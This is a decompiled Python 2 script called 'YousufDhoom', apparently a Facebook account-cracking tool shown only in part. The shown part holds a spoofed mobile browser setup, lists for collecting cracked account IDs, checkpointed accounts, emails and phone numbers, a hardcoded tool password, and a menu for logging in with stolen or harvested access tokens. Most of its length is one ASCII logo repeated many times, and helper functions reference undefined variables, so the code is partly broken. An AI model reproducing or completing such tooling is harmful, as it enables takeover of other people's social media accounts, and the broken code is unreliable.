
# Python Auto Dis Parser 1.1.0
# Author : HTR-TECH | TAHMID RAYAT
# https://linktr.ee/tahmid.rayat
# https://fb.me/tahmid.rayat.official
# ------------------------------------------
# Embedded File   : YousufDhoom/YousufDhoom.py
# Python Bytecode : 2.7 (62211)
# Decompiled at   : Mon Oct 12 11:01:37 2020
# ------------------------------------------

#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To Muhammad Yousuf
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)

#### colours ####
B='\033[1;96m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
Y='\033[1;93m'
R='\033[1;94m'

#Dev: qaiser
##### LOGO #####
logo = """
\033[1;92m
\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯

\033[1;93m---------------------Yousuf---------------------

\033[1;92mCreater      : \033[1;92mYousufAlzadjali
\033[1;93mFacebook: \033[1;93mMuhammadYousuf
\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;93m-----------------Yousuf-------------------------
"""
logo2 = """
\033[1;92m
\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯

\033[1;93m---------------------Yousuf---------------------

\033[1;92mCreater      : \033[1;92mYousufAlzadjali
\033[1;93mFacebook: \033[1;93mMuhammadYousuf
\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;93m-----------------Yousuf-------------------------
"""
logo3 = """
\033[1;92m
\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯

\033[1;93m---------------------Yousuf---------------------

\033[1;92mCreater      : \033[1;92mYousufAlzadjali
\033[1;93mFacebook: \033[1;93mMuhammadYousuf
\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;93m-----------------Yousuf-------------------------
"""
logo4 = """
\033[1;92m
\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯

\033[1;93m---------------------Yousuf---------------------

\033[1;92mCreater      : \033[1;92mYousufAlzadjali
\033[1;93mFacebook: \033[1;93mMuhammadYousuf
\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;93m-----------------Yousuf-------------------------
"""
logo5 = """
\033[1;92m
\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯

\033[1;93m---------------------Yousuf---------------------

\033[1;92mCreater      : \033[1;92mYousufAlzadjali
\033[1;93mFacebook: \033[1;93mMuhammadYousuf
\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;93m-----------------Yousuf-------------------------
"""
logo6 = """
\033[1;92m
\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯

\033[1;93m---------------------Yousuf---------------------

\033[1;92mCreater      : \033[1;92mYousufAlzadjali
\033[1;93mFacebook: \033[1;93mMuhammadYousuf
\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;93m-----------------Yousuf-------------------------
"""
logo7 = """
\033[1;92m
\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯

\033[1;93m---------------------Yousuf---------------------

\033[1;92mCreater      : \033[1;92mYousufAlzadjali
\033[1;93mFacebook: \033[1;93mMuhammadYousuf
\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;93m-----------------Yousuf-------------------------
"""
logo8 = """
\033[1;92m
\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯

\033[1;93m---------------------Yousuf---------------------

\033[1;92mCreater      : \033[1;92mYousufAlzadjali
\033[1;93mFacebook: \033[1;93mMuhammadYousuf
\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;93m-----------------Yousuf-------------------------
"""
logo11 = """
\033[1;92m
\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯

\033[1;93m---------------------Yousuf---------------------

\033[1;92mCreater      : \033[1;92mYousufAlzadjali
\033[1;93mFacebook: \033[1;93mMuhammadYousuf
\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;93m-----------------Yousuf-------------------------
"""
logo12 = """
\033[1;92m
\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯

\033[1;93m---------------------Yousuf---------------------

\033[1;92mCreater      : \033[1;92mYousufAlzadjali
\033[1;93mFacebook: \033[1;93mMuhammadYousuf
\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;93m-----------------Yousuf-------------------------
"""
logo13 = """
\033[1;92m
\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯

\033[1;93m---------------------Yousuf---------------------

\033[1;92mCreater      : \033[1;92mYousufAlzadjali
\033[1;93mFacebook: \033[1;93mMuhammadYousuf
\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;93m-----------------Yousuf-------------------------
"""
logo14 = """
\033[1;92m
\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯

\033[1;93m---------------------Yousuf---------------------

\033[1;92mCreater      : \033[1;92mYousufAlzadjali
\033[1;93mFacebook: \033[1;93mMuhammadYousuf
\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;93m-----------------Yousuf-------------------------
"""
logo15 = """
\033[1;92m
\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯

\033[1;93m---------------------Yousuf---------------------

\033[1;92mCreater      : \033[1;92mYousufAlzadjali
\033[1;93mFacebook: \033[1;93mMuhammadYousuf
\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;93m-----------------Yousuf-------------------------
"""
logo16 = """
\033[1;92m
\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯

\033[1;93m---------------------Yousuf---------------------

\033[1;92mCreater      : \033[1;92mYousufAlzadjali
\033[1;93mFacebook: \033[1;93mMuhammadYousuf
\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;93m-----------------Yousuf-------------------------
"""
logo17 = """
\033[1;92m
\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯

\033[1;93m---------------------Yousuf---------------------

\033[1;92mCreater      : \033[1;92mYousufAlzadjali
\033[1;93mFacebook: \033[1;93mMuhammadYousuf
\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;93m-----------------Yousuf-------------------------
"""
logo18 = """
\033[1;92m
\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯

\033[1;93m---------------------Yousuf---------------------

\033[1;92mCreater      : \033[1;92mYousufAlzadjali
\033[1;93mFacebook: \033[1;93mMuhammadYousuf
\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;93m-----------------Yousuf-------------------------
"""
logo19 = """
\033[1;92m
\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯

\033[1;93m---------------------Yousuf---------------------

\033[1;92mCreater      : \033[1;92mYousufAlzadjali
\033[1;93mFacebook: \033[1;93mMuhammadYousuf
\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;93m-----------------Yousuf-------------------------
"""
logo20 = """
\033[1;92m
\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯

\033[1;93m---------------------Yousuf---------------------

\033[1;92mCreater      : \033[1;92mYousufAlzadjali
\033[1;93mFacebook: \033[1;93mMuhammadYousuf
\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;93m-----------------Yousuf-------------------------
"""
logo21 = """	
\033[1;92m
\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯

\033[1;93m---------------------Yousuf---------------------

\033[1;92mCreater      : \033[1;92mYousufAlzadjali
\033[1;93mFacebook: \033[1;93mMuhammadYousuf
\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;93m-----------------Yousuf-------------------------
"""
logo22 = """
\033[1;92m
\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯

\033[1;93m---------------------Yousuf---------------------

\033[1;92mCreater      : \033[1;92mYousufAlzadjali
\033[1;93mFacebook: \033[1;93mMuhammadYousuf
\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;93m-----------------Yousuf-------------------------
"""
logo23 = """
\033[1;92m
\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯

\033[1;93m---------------------Yousuf---------------------

\033[1;92mCreater      : \033[1;92mYousufAlzadjali
\033[1;93mFacebook: \033[1;93mMuhammadYousuf
\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;93m-----------------Yousuf-------------------------
"""
logo24 = """
\033[1;92m
\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯

\033[1;93m---------------------Yousuf---------------------

\033[1;92mCreater      : \033[1;92mYousufAlzadjali
\033[1;93mFacebook: \033[1;93mMuhammadYousuf
\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;93m-----------------Yousuf-------------------------
"""
logo25 = """
\033[1;92m
\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯

\033[1;93m---------------------Yousuf---------------------

\033[1;92mCreater      : \033[1;92mYousufAlzadjali
\033[1;93mFacebook: \033[1;93mMuhammadYousuf
\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;93m-----------------Yousuf-------------------------
"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;91mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
gagal = []
idfriends = []
idfromfriends = []
idmem = []
em = []
emfromfriends = []
hp = []
hpfromfriends = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """

\033[1;92m======================================

\033[1;92m▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
\033[1;93m▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
\033[1;92m▒▒█▒▒▒▄██████████▄▒▒▒▒
\033[1;93m▒█▐▒▒▒████████████▒▒▒▒
\033[1;92m▒▌▐▒▒██▄▀██████▀▄██▒▒▒
\033[1;93m▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒
\033[1;92m▐┼▐▒▒██████████████▒▒▒
\033[1;93m▐▄▐████─▀▐▐▀█─█─▌▐██▄▒
\033[1;92m▒▒█████──────────▐███▌
\033[1;93m▒▒█▀▀██▄█─▄───▐─▄███▀▒
\033[1;92m▒▒█▒▒███████▄██████▒▒▒
\033[1;93m▒▒▒▒▒██████████████▒▒▒
\033[1;92m▒▒▒▒▒██████████████▒▒▒
\033[1;93m▒▒▒▒▒█████████▐▌██▌▒▒▒
\033[1;92m▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
\033[1;93m▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
\033[1;92m▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒


\033[1;92m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
\033[1;93m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
\033[1;92m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
\033[1;93m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
\033[1;92m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
\033[1;93m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯
\033[1;92m-------------------

"""

CorrectUsername = "Yousuf"
CorrectPassword = "WeLoveYou"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;97m\x1b[1;97mTool Username \x1b[1;97m------- \x1b[1;93m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;97m\x1b[1;97mTool Password  \x1b[1;97m------- \x1b[1;93m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:qaiser
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;91mWrong Password"
            os.system('xdg-open https://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A')
    else:
        print "\033[1;91mWrong Username"
        os.system('xdg-open https://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A')

##### LICENSE #####
#=================#
def lisensi():
	os.system('clear')
	login()
	####login#########
def login():
	os.system('clear')
	print 42*"\033[1;97m="
	print "\033[1;93m>>>\033[1;93m[1]\033[1;93m Login with Facebook  "
        time.sleep(0.05)
        print "\033[1;92m>>>\033[1;92m[2]\033[1;92m Login with access token "
        time.sleep(0.05)
        print "\033[1;93m>>>\033[1;93m[3]\033[1;93m Download Access token"
	time.sleep(0.05)
	print "\033[1;92m>>>\033[1;92m[0]\033[1;92m Logout        "
        print 42*"\033[1;97m="
	pilih_login()

def pilih_login():
	peak = raw_input("\n\033[1;97mChoose an Option═╬══►\033[1;92m")
	if peak =="":
		print "\x1b[1;92mFill in correctly"
		pilih_login()
	elif peak =="1":
		login1()
        elif peak =="2":
	        tokenz()
        elif peak =="3":
	        os.system('xdg-open https://play.google.com/store/apps/details?id=com.proit.thaison.getaccesstokenfacebook')
	        login()
	elif unikers =="0":
